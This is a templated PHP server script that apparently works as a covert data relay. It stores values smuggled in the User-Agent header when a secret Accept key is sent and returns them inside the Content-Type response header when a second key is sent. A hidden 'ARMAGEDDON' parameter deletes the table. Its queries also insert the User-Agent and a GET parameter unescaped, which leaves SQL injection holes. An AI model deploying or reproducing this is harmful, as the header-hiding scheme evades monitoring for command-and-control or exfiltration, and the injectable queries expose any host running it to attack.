<?php
$postKey="{{postKey}}";$getKey="{{getKey}}";$table="{{table}}";
$tableBegin={{tableBegin}};$tableID="{{tableID}}";

function connect_database(){
  require_once 'config.php';
    $conn = mysqli_connect(DB_HOST, DB_USER, DB_PASS, DB_NAME);
  if ($conn->connect_error) {
     die('Connection failed: ' . $conn->connect_error);
  }
  return $conn;
}
$conn = connect_database();
$query = "CREATE TABLE IF NOT EXISTS $table (
  $tableID BIGINT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
  $table VARCHAR(1000) NOT NULL);";
$alter = "ALTER TABLE $table AUTO_INCREMENT=$tableBegin;";
$conn->query($query);
$conn->query($alter);

if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_SERVER['HTTP_ACCEPT'] == $postKey) {
  $conn = connect_database();
  if(isset($_SERVER['HTTP_USER_AGENT'])){
    $num = $_SERVER['HTTP_USER_AGENT'];
    $query = "INSERT INTO $table ($table) VALUES ('$num')";
    $conn->query($query);
  }
}

if ($_SERVER['REQUEST_METHOD'] === 'GET' && $_SERVER['HTTP_ACCEPT'] == $getKey) {
  $conn = connect_database();

  if(isset($_GET['ARMAGEDDON']) && $_GET['ARMAGEDDON'] == "{{armageddonKey}}"){
    $query = "DROP TABLE $table";
    $conn->query($query);
  }

  if(isset($_GET[$tableID])){
    $query = "SELECT $table FROM $table WHERE $tableID = '$_GET[$tableID]'";
    $result = $conn->query($query);
    $row = $result->fetch_assoc();
    header("Content-Type: " . $row[$table]);
  }
}
$conn->close();
?>